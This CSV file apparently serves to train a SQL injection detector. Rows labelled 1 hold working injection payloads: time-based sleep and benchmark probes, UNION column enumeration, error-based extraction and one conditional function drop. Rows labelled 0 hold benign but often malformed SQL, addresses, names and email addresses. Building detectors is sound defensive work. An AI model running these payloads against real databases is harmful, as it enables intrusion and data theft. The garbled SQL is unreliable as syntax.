Query,Label
"iif 	(  7953	= 3021,1,1/0 )",1
"selectcount	(		* ) 	from generate_series(  1,5000000	)	and('tnvm'	like'tnvm",1
"-9854 )or5023 =	ctxsys.drithsx.sn (	5023, (	chr	(  113  )	||chr (	113) ||chr 	(112 ) ||chr(	106) ||chr	( 113 )	|| 	(  select( case	when(5023	= 5023	)then	1 else0 end)	  from dual	)||chr(	113  )	||chr	 (	122)||chr	(	118	)	||chr (	122	)		||chr	(	 113  	)) )		and 	(	 5696	=	5696",1
DELETE FROM seems WHERE cream = 'production',0
"c/ cels gomis i mestre 171,",0
1'+	(	 selectwpbj	where 1849 =	1849,1
"paseo pinos, 147",0
"-3971%'		)  )		 ) orelt	( 1032 =1032,3623 ) and	(  	( 		 ('%'  = 	'",1
SELECT TOP 3 * FROM each SELECT * FROM oil 3SELECT * FROM behind,0
SELECT part ( s )  FROM cannot LEFT JOIN,0
"call	regexp_substring	 ( repeat	(	left	( crypt_key	(	char( 65)	 ||char	(		69) ||char (	 83 	),null)		,0)	 ,500000000 ) ,null	) 	and'%'= '",1
"-4477' )	 	)	union	allselect	8444,8444,8444,8444,8444,8444,8444,8444--",1
"1where2031 =  2031	or 5356 = (selectcount	 ( *)	 from sysusersassys1,sysusers	as sys2,sysusers	as sys3,sysusers	as	sys4,sysusersassys5,sysusers	assys6,sysusers assys7	)  --",1
SELECT COUNT ( box ) FROM balance,0
SELECT * FROM electricity FETCH FIRST 3 ROWS ONLY,0
1and	3715in  ((char  ( 	113	) +char	(113 ) +char	(		112)	 +char(106 )		+char(	 113	)	+(  select ( case	when	( 3715=3715	)	thenchar (49	)	 else	char ( 48)	end ) 	) +char ( 113 )	+char	(	122	 )  +char(  118 ) +char 	(122)	+char		( 113 )	 )  	),1
1%'rlike 	(	select  (		case	when	 	(	3596=	4245	 ) then	1else0x28 end		)   )	and '%'	=		',1
SELECT * FROM essential FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM horse,0
"-3873%'	)	 ) 		or1	group	by	concat  (0x7171706a71,	(	select	(	 case	when ( 4232=4232)	then1else 0 end 	)),0x717a767a71,floor (	rand (0	)	*2   ) 	 )		 havingmin 	( 0	)	#",1
"SELECT low,bound,develop,kill,older     (  (  string JOIN beyond ON youth.speed =  studying.bend )   INNER JOIN masterON Orders.feel =  greatly.trackID )",0
"1')  as uqkzwhere	8482	=8482and8407 =	(select count( *	)	fromgenerate_series	( 1,5000000	) 	)	 --",1
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,0
endand	 (  '%'	 =		',1
"-6987' union	all select4721,4721--",1
equilibrio,0
cagarria,0
-3677'	 	)			) 	or 1939		=	4484,1
SELECT * FROM clothing WHERE laugh BETWEEN '1996-07-01' AND '1996-07-31',0
"1'||( select'mzhj'where 9677 = 9677union	all select null,null,null--",1
milton,0
SELECT secret ( s FROM must RIGHT JOIN,0
-4583'	)   asevbowhere 6055=		6055unionallselect	6055--,1
45810,0
SELECT Count ( * )  AS women,0
"selectcount  (*)	from all_userst1,all_users	t2,all_userst3,all_users t4,all_userst5and		 ( ""snwx""like	""snwx",1
SELECT Count ( * )  AS route,0
SELECT fought ( s )  FROM planned,0
"-5996)	or5023=	ctxsys.drithsx.sn( 5023, (	 chr 	(113)	||chr  (113)	 ||chr(	112	) ||chr( 106		) ||chr	(	 113		)||( select ( 	case	when  (	5023 	=	5023	)then	1else0	end	 )	fromdual )	||chr (  113	)	 ||chr	( 122)	||chr ( 118)	||chr (	122 ) ||chr	(	113	)  	)  	)",1
"1%'  ) 	 ) 		andmake_set(	6527 =	9529,9529 	)	and 		(	 	(		'%'='",1
"SELECT lack, no, previousFROM twenty WHERE nails  IS NOT NULL",0
lavada,0
"1 	 )  	)  as	nxdf	where1696 =1696	or8514 =  benchmark	( 5000000,md5(0x544d5a4c )  )			#",1
arimany aguila,0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ),0
"SELECT bagID AS ID, rush AS young FROM material",0
SELECT * FROM spread FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM himself,0
"SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )",0
/**/or/**/1/**/		= /**/1,1
"calle prat de la riba, 73",0
SELECT AVG ( neck ) FROM leader,0
"1'||	(	select	'jzwq' where3289 = 	3289union	all	selectnull,null,null,null,null,null,null#",1
SELECT COUNT ( darknessID ) FROM nodded,0
SELECT * FROM bare WHERE tomorrow BETWEEN bent09/01/1996improve AND clock15/31/1996musical,0
if 	( 8995		=	9787		)		 select8995elsedropfunctionofgg--,1
"1 )		and 6055	= ctxsys.drithsx.sn	(	6055, ( chr	 (	 113 )		||chr  ( 113) 	||chr(	 112	) ||chr(	106) 	||chr (	 113 )|| (select 	(		casewhen (	6055=  6055	) 	then 1else0end	 )  fromdual) ||chr	(	113)	||chr		( 122	) ||chr	 ( 	118 )||chr	(	122)  ||chr (	113		) 	 ) 	 )",1
select*from userswhereid	=1<@.$or 1=1	--	1,1
SELECT TOP 3 * FROM between,0
"SELECT Orders.sayrID, Employees.rose, Employees.steep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.foxID ORDER BY Orders.climateID",0
hoog,0
geffner-schoo@bacoespecialseleccin.bm,0
"SELECT giant AS rhyme, copper AS [particular]  FROM loose",0
SELECT * FROM log WHERE primitive  BETWEEN 10 AND 20,0
"1"" 		) 	)) and6240  = 	 (	'qqpjq'||(  select case	6240 when 6240then1else 0 end	fromrdb$database	)	||'qzvzq'	)	and				((		( ""buwe""  =""buwe",1
SELECT memory ( s )  FROM powerful SELECT lying FROM money,0
SELECT COUNT ( DISTINCT serve )  FROM completely,0
"SELECT column_name ( s )  FROM itself,atom",0
"1"") 	orsleep( 5	)	and	 (""xgtk""	= ""xgtk",1
8.42194E+15,0
1) 		)	  ) and 8990=		4775and ( 		(				(	1894	 =	1894,1
"-3767')	as eeflwhere	8260 =	8260unionallselect	8260,8260,8260,8260,8260,8260,8260#",1
ruesga,0
palls de buran,0
50344,0
"-8707')	 union	all select 5609,5609,5609--",1
1 )   )	  asfqeewhere3286=	3286,1
gaspard-birgel@indorec.kr,0
"1'in booleanmode	) 	 unionallselect	null,null,null,null,null,null,null,null--",1
"SELECT longer, rocky, sweet FROM metal WHERE someone  IS NULL",0
7395,0
"1%'	)	 and extractvalue (7982,concat (  0x5c,0x7171706a71,(select		(	elt(	7982	=7982,1 )  )			 )	,0x717a767a71	) 	)   and( '%'	 =	 '",1
"select*	from	userswhere id =1 <@.	unionselect	1,version ( )	 -- 1",1
"select	* from	generate_series		(8147,8147,case	when	(8147 =	 6336 ) 		then 1 else0end  ) 	limit 1--",1
SELECT * FROM twelve WHERE example = 'use'  AND City = 'unless',0
17130,0
SELECT * FROM deeply WHERE negative NOT BETWEEN 'usual' AND 'plastic',0
"1'		)	  asezoa where 4915= 4915and 9660 = (	selectcount (	*	) fromall_userst1,all_userst2,all_users t3,all_users	t4,all_users	t5	)	 --",1
SELECT * FROM cause WHERE atomic = 'plural',0
1'	)	where1424=	1424andsleep	(	5  )	--,1
"-5204""	 ) union all	select7186,7186,7186--",1
"-7635""unionall select1284,1284,1284,1284,1284,1284#",1
"-7802'  )	 )				)or	elt	( 	8778	=	9974,9974 )and 	(	(		( 'glsq' like'glsq",1
"1"" ))as jikg	where	8258	 =	8258	and		 ( 3973= 1047 ) *1047--",1
"1'+ 	(select 'arqt' where2336	=	 2336orchar (75 )		||char( 70 )||char	(99 	)		||char ( 83	)  	= regexp_substring(	repeat	(left ( crypt_key ( char ( 65 )	||char  ( 69	)||char ( 83  )	,null	 )	 ,0	)	,500000000	 ),null	)		--",1
SELECT * FROM win ORDER BY advice,0
DELETE FROM satellites,0
"SELECT MAKEDATE ( 2017, 366 ) ;",0
SELECT AVG ( begun ) FROM band SELECT SUM ( chosen ),0
levert,0
"diamante, 114,",0
cracoviano,0
SELECT * FROM notice FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cross,0
SELECT * FROM  ( SELECT instance FROM coach ),0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  )",0
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle',0
DELETE FROM forty WHERE till = 'come',0
"1%'or4915	 = (select count( *	)		from domain.domains ast1,domain.columnsast2,domain.tablesast3 )		--",1
"1'+ 	(		select	'sacd'where5984 =	5984 unionallselectnull,null,null,null,null,null,null#",1
"1'+ (select	'eoxk'where	6621	 = 6621union allselect null,null#",1
"1' )	 where7093	=		7093 and 8148=like(	'abcdefg',upper ( hex  (	randomblob 	(500000000/2	 )	 )	 	  )		  )	 --",1
"1' ) or char(	117	)||char( 111	)	||char		( 	105)||char 	(	 100 )  =	 regexp_substring ( repeat(left	(crypt_key(char  (	65)||char	(	69) 	||char(	83	) ,null	),0 )		,500000000	 )	,null ) and 	(	'ozef'	=	'ozef",1
"SELECT circleID AS ID, stove AS headed FROM thing",0
SELECT * FROM slip FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""where 1452=	1452union all	selectnull,null,null,null--",1
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0
"select count		( *	)	from rdb$fieldsas	t1,rdb$types	as t2,rdb$collationsas	t3,rdb$functions as t4and	'bnfu'like	'bnfu",1
"1%""	)  or sleep (	5  )		and (""%"" =  """,1
SELECT * FROM thus 3,0
SELECT * FROM  ( SELECT mind FROM between ),0
48289,0
takakura@cenitsoria.sb,0
SELECT * FROM consonant WHERE regular LIKE '%now%',0
"paso de la soledad, 130 10?f",0
shedd,0
48042322z,0
SELECT * FROM rope WHERE Price NOT BETWEEN 10 AND 20,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 193 )  ORDER BY meta_id ASC",0
"-7812'	) or	5023=	ctxsys.drithsx.sn	(  5023, (	chr( 	113	 ) 	||chr ( 	113	) ||chr 	( 112  ) ||chr (	106)	||chr (	113		)  ||		(select		( 	casewhen(5023 =5023	)		 then 1 else	0	end)	fromdual	)		||chr 	(	113)	||chr 	(122 	)||chr	( 118 ) ||chr (	122	)||chr ( 113  	)		 )		  ) and	 ( 'ttvo' = 'ttvo",1
shirleen,0
SELECT AVG ( out ) FROM colony,0
vildo@prensahp.fj,0
SELECT roof ( s ) FROM diameter INNER JOIN,0
SELECT stick ( s ) FROM gentle INNER JOIN,0
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',0
1'|| 	( select'bqhi'from dual where7409=	7409,1
"INSERT INTO respect  ( say, officer, on )  VALUES  ( 'ruler', 'party', 'gradually' )",0
"SELECT personalID AS ID, tape AS couple FROM happy",0
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ),0
SELECT * FROM fun WHERE    NOT travel = 'pair',0
"SELECT column_name ( s )  FROM tea,child",0
"1""	)	and	8677  =	 9054#",1
ren,0
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,0
orejana,0
"1'  ) ) 	as prxm where1267		= 1267 and	3580=	  (select count (* ) fromdomain.domainsas t1,domain.columns	ast2,domain.tables ast3) --",1
brenda,0
5.65818E+15,0
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0
"1""	and 8312 =dbms_pipe.receive_message (	 chr(		69)	||chr	(	 79	) ||chr	(	101) 	||chr	(68),5		)	 --",1
"-7845'	unionallselect9574,9574,9574,9574,9574,9574#",1
17154,0
"1		)		unionallselect	null,null#",1
murad@magadan.org.pe,0
17005940q,0
1		))	  asoqyo	where7995=7995,1
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"SELECT moreID AS ID, studied AS social FROM movement",0
"1""andelt 	( 1210= 1210,sleep(	5			)  ) 	 and""zhxm""	 =  ""zhxm",1
"1"" where6800= 6800	procedure analyse	(	 extractvalue 	(	9627,concat 	( 0x5c,	(benchmark	 ( 5000000,md5  (0x4b774c75)	 )		)	 	 ) 	 ) 	,1) #",1
"CREATE TABLE IF NOT EXISTS `zcf_submitlogs`  (  `id` int ( 6 )  unsigned NOT NULL AUTO_INCREMENT, `crmsubmitlogStatus` varchar ( 20 )  DEFAULT NULL, `crmsubmitlogDescribtion` longtext NOT NULL, `crmsubmitFormType` varchar ( 30 )  NOT NULL, PRIMARY KEY  (  id  )   )  ENGINE = InnoDB DEFAULT CHARSET = utf8",0
1 	)	 where	1929=1929and (select*from	( select(	sleep	 (5  ) )		)	fzno 	) --,1
"(	select	count(	* ) 	from	rdb$fields	ast1,rdb$typesast2,rdb$collations	as	t3,rdb$functions	ast4)",1
"SELECT * FROM being ORDER BY said ASC, coal DESC",0
"1"" )	 as	bpmkwhere6412	=6412	union	allselect null,null,null,null#",1
FROM  ( SELECT DISTINCT bend FROM village ),0
"-3270%'	or elt(	 9404=	3498,3498)		and	'%'	= 	'",1
"-6587'	 )unionallselect6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1
"1"")	where	2473 	=2473andmake_set ( 6118		=7684,7684 )	--",1
08109487d,0
"select count( *)	 fromall_users	t1,all_userst2,all_userst3,all_users t4,all_userst5 and	  (	  	( 	('juhi'	like 'juhi",1
SELECT MIN ( wood )  AS union FROM disease,0
1' where	5455=5455	and	sleep ( 5 ) --,1
"SELECT * FROM label ORDER BY rocket, particularly",0
"SELECT cheeseID AS ID, obtain AS fed FROM stay",0
SELECT * FROM complex WHERE struck = 'chosen'  OR measure = 'blood',0
SELECT * FROM star WHERE Price NOT BETWEEN 10 AND 20,0
04or2ativ1,0
SELECT ACOS ( -0.8 ) ;,0
"(	select* from	 (	select	( sleep	 (	5 )  )	  	)  srmq	) and	 (		(		""%""	=	""",1
canciano,0
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ),0
"1"") 	or6793		=	(	 select6793 from	pg_sleep( 	5	  )	 	)		and	(	 ""lsis""	like""lsis",1
"SELECT explainID AS ID, beautiful AS eager FROM with",0
"-2962'	) )    )	or	1570		=convert	(  int,	(	select char	 ( 	113	) +char  (	113 ) +char	(  112	) +char 	(	106 	)	+char( 113) +(select			(	casewhen  (	1570 	=1570  )		then	char 	(  49	)	elsechar(	 48 )  	end		)		 	)	 +char	(	113)+char 	(122		) 	+char ( 118	)+char ( 122	)	 +char (	113 )	 	)  ) 	and		 ( ( 	 (	 'hkjo' ='hkjo",1
1.62177E+15,0
SELECT * FROM judge WHERE rain = 'power'  OR pull = 'month',0
"select*	fromusers where id	=	1.<@$union	select1,version	(	 )	 -- 1",1
-7624' )  or	5903= 		( 'qqpjq'||	( selectcase	5903when5903then	1	else 0end	fromrdb$database) ||'qzvzq' )and	( 'iwab' 	= 'iwab,1
"-1591where3291	 = 3291union	allselect3291,3291,3291,3291,3291,3291,3291,3291,3291#",1
"1""androw	(	6237,7469 ) > (	select	count (		*	)	,concat	(	0x7171706a71,	 ( select	(		elt(6237= 6237,1 	)	 	) 	)	,0x717a767a71,floor  (rand (  0	) *2)  )		xfrom (	select	5192 unionselect 3785unionselect	3931unionselect 7158)	agroup byx	)",1
SELECT dollar,0
1'		)	and 3754	= 	(select	upper 	( xmltype(	 chr	 (  60	)||chr(58) ||chr ( 113  ) ||chr	(	113 ) ||chr ( 	112 )||chr(106	 ) ||chr 	( 113 )||		( select 	 (		case when		(	3754 	=	3754)	 then 1 else0	end)	fromdual)	||chr	(	113)	||chr (	122 )||chr( 118		)	||chr	(	122 )||chr	(113 )  ||chr	(	 62	)  		)	 ) from dual )	and ( 'ulkq'='ulkq,1
"-2548""	 ) 	)	)	  or 5107		=8049--",1
SELECT AVG ( ice ) FROM universe,0
FROM  ( SELECT DISTINCT twice FROM larger ),0
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",0
end	and			(((	3673	=3673,1
SELECT * FROM least 3 SELECT * FROM love,0
nogueira de ramun,0
cholgua,0
hoeflich@movil-google.cx,0
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,0
"1""  )	 )	 or		(	select 2* 	(	if	(			 (select	* from( 	selectconcat	(	0x7171706a71, (	select	(elt	(	8113	=8113,1		 )		)   )	,0x717a767a71,0x78 	)  	 )	 s		),8446744073709551610,8446744073709551610) )	)		and  	(	 	(	 ""nobt""	 =	 ""nobt",1
SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh,0
sempronia,0
"1' inbooleanmode	)	 orupdatexml	(	1808,concat	(		0x2e,0x7171706a71,( select		( elt ( 1808 =1808,1 	) 	)		) 	,0x717a767a71),8666 ) 	#",1
"c/ aulencia, 84",0
"1""and7756= dbms_utility.sqlid_to_sqlhash		(			(  chr (	113 	)||chr 	(	113	)	 ||chr( 112	 )||chr	 (106)	 ||chr ( 113		)  ||	(	select (	casewhen	(	 7756	 =		7756  ) then1else0end )	from dual)||chr  (113	 )||chr  ( 122  )||chr	( 	118)  ||chr(	122	)||chr		( 113 	)			)	  )and ""jgcv""=	""jgcv",1
1'||	(	select 'znba'	where8323	 =  8323,1
wambsgan,0
SELECT COUNT ( DISTINCT visit )  FROM prove,0
ornela,0
"1'where 9994  =		9994and 9660	= ( selectcount	(*)fromall_users t1,all_userst2,all_userst3,all_users	t4,all_users t5 )--",1
"1'		)	) 	  )	andchar		(		111	 ) ||char (77)||char	( 121	 )	||char	 (	88  ) 	=	regexp_substring(	 repeat( left(crypt_key (	char	( 65		)	||char (	69) ||char ( 83),null	)	,0 ) ,500000000	)	,null ) 	and (	( 	('tvar'= 'tvar",1
"1%' )	 	orchar ( 119	 )||char	( 100	)||char	(	99 	)		||char		(121)			 = regexp_substring  (repeat	( right(char  (	1441),0 ),5000000000	 ),null )	--",1
8.83352E+15,0
SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider',0
esbarar,0
"1%') 		 )		and4241 	=		convert(		int, (selectchar (  113)+char	(	113  )+char (112	)+char (106 	)		+char	(	 113	 )  +	( 	select  ( case	when			(	4241	 = 	4241	 )	then	char	(49)	else char ( 48)	end   )	 	) 	 +char	 ( 113	) +char	(122  )  +char	 (118	)	 +char (122 	)	+char	(		113	)  ) 	)	and	(	(		'%'='",1
1%'	) 	)	 	)	and4386=utl_inaddr.get_host_address  (	chr	(	113) ||chr  ( 113)  ||chr  (  112	) ||chr		(	106 	)||chr	( 113 	)|| ( select	(	case	when	 (4386 =  4386 )  then 1else 0	end	 )		fromdual		)	||chr(  113)		||chr (122)	||chr ( 118 	) ||chr	 (  122)	||chr	( 113		 )		 )	and	(		(	  (	'%'	=',1
"select * from	generate_series( 	1134,1134,casewhen	( 	1134=  4909 )	then	1else0	end	)limit1--",1
yasna,0
SELECT AVG ( Price ) FROM available,0
"1%""	 ) 	 ) 	 and	3754	=  	(	 select	upper (xmltype (chr 	(	60 )	||chr(	 58	) ||chr(	113 	)||chr (	113	)  ||chr	 (	112	)	||chr (  106		)	||chr	(113)	||	(select(casewhen		(3754	=	3754)	 then 1 else	0	end	 ) 	from	dual		) ||chr	(	113) ||chr	(122	)||chr	(		118)||chr (	122	 )  ||chr(	 113)	||chr(	62 	)	 )  )	from dual)and	 ( 	(""%""=	""",1
86943454g,0
"1""	where 6686=	 6686 or elt 	(	 6272 =	 6272,sleep		(	 5 )	  ) --",1
SELECT CURRENT_TIMESTAMP (  )  + 1;,0
select( casewhen	 (6179=	8476  ) then6179 elsecast 	(	1	asint 	) /	( select0fromdual ) end	)	fromdual--,1
44923287d,0
philipp.castella@biopoint.vc,0
46793939w,0
1'+	(		select	ukwc	where3008 	=		3008 or	(	select	*from  (		select		( sleep (5	)	)  	)	sddo ) #,1
blancafort,0
SELECT * FROM shout WHERE means = 'eye'  OR sad = 'win',0
"SELECT islandID AS ID, skin AS because FROM thousand",0
pascuet landivar,0
"1'|| 	( select'mwmn'	where	5112 =		5112or	(	select	9173	from(select	count( 	* ),concat	(0x7171706a71, ( select(	elt( 9173= 9173,1 )	)  ),0x717a767a71,floor (	rand 	(	0)		*2  )	)		x frominformation_schema.character_setsgroup byx 	)	a  ) )   ||'",1
SELECT TOP 3 * FROM finest WHERE bread = 'secret',0
SELECT * FROM what WHERE by = 'quarter',0
us,0
SELECT edge,0
"selectsleep  (	5	 )		and  (	""%""	=""",1
"-3368' )	 ) unionall	select	4913,4913,4913,4913,4913,4913,4913,4913,4913--",1
"-8026or	elt (		8434=	4516,4516	)	#bsqo",1
56,0
DELETE FROM somehow WHERE factor = 'fruit',0
"1  	)	 )	 as jfae where6684  =6684 and 2716  =		 ( selectcount(	*		)from	sysusers	assys1,sysusersas sys2,sysusers	assys3,sysusers assys4,sysusers	as	sys5,sysusersassys6,sysusers	as sys7	)--",1
SELECT afternoon,0
"1where7196  = 7196or8466 =		benchmark (	5000000,md5  (		0x694a4745		) )--",1
basilisa,0
SELECT COUNT ( DISTINCT yes )  FROM guide,0
SELECT * FROM bend  WHERE own NOT LIKE '[needle]%',0
SELECT * FROM with WHERE depth = 'wore'  OR feel = 'red',0
"SELECT Employees.affect, COUNT ( Orders.coldID )  AS jarFROM    ( OrdersINNER JOIN amount ON Orders.symbolID  =  Employees.silkID )",0
SELECT COUNT ( spoken )  FROM explanation,0
"logroo, 98, 5-d",0
"-7776' ) or5023 =ctxsys.drithsx.sn	( 5023, 	(	chr (	113 )		||chr	 (	 113	) ||chr(	112	)	 ||chr 	(106	)||chr	(	113)		||	( select (		case	when ( 5023=	5023		)  then 1else 0end)	from	dual)	||chr	(  113	 )  ||chr	(	122	 )  ||chr(118 )||chr 	( 	122	 )	||chr	(113	)	) 		) 	and( 'ihof' =	'ihof",1
select( case	when	(5423	 =7706	)	 then5423	elsecast ( 1asint		)/(select0fromdual	)	 	end	) fromdual--,1
"UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0
SELECT TOP 3 * FROM suit WHERE seen = 'land' SELECT * FROM such,0
retiendas,0
alobras,0
28530,0
ull colmenares,0
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ),0
"1' ) 	)as nlfqwhere3410 =	3410	or extractvalue( 1297,concat	(0x5c,0x7171706a71,	(select	 ( elt(	1297=	1297,1 	)			)	  ) ,0x717a767a71 )	  	)		--",1
"madrid, 27",0
"-5360'where	8178		= 	8178	unionall	select8178,8178,8178--",1
cerpa oitavn,0
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20,0
marcos esculta,0
"1""		)	 unionallselectnull,null,null,null,null,null,null,null,null,null#",1
SELECT TOP 3 * FROM greatest WHERE western = 'brave' SELECT * FROM record,0
1'	 	)	 )    )unionallselectnull#,1
"SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer  FROM wherever",0
"1%'orchar  (	68		) ||char( 69  ) 	||char	(97 ) ||char(	85	)	 =	regexp_substring	( repeat(	right (	char	 ( 5389 )	,0	) ,5000000000	 )	,null  )	and '%' 	= '",1
SELECT * FROM rather 3 SELECT * FROM prove,0
SELECT * FROM harbor FETCH FIRST 50 PERCENT ROWS ONLY,0
"""^""",1
-2316'		) )		 	) or 8519	 =  6010,1
SELECT AVG ( aware ) FROM ship,0
SELECT * FROM garden WHERE bear NOT LIKE '[hill]%',0
SELECT AVG ( Price ) FROM sail,0
"SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID )",0
or ''',1
1where3744 =	3744,1
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0
"-4925"" unionall select 5686,5686,5686,5686,5686,5686,5686#",1
SELECT * FROM did WHERE body = 'pound'  AND  ( pour = 'original' OR tank = 'course' ),0
elda,0
SELECT * FROM practical  WHERE every NOT LIKE '[calm]%',0
"selectcount (	 *)  	from	all_users	t1,all_userst2,all_users t3,all_users t4,all_users	t5and 	(  ( 	 ( ""ymss""  = ""ymss",1
-8369 )	 where 7234 =7234orderby1--,1
1')  	)	as sjzf	where	9997 	=	9997and4193 	=	5408,1
SELECT * FROM automobile WHERE getting = 'move'  OR development = 'paid',0
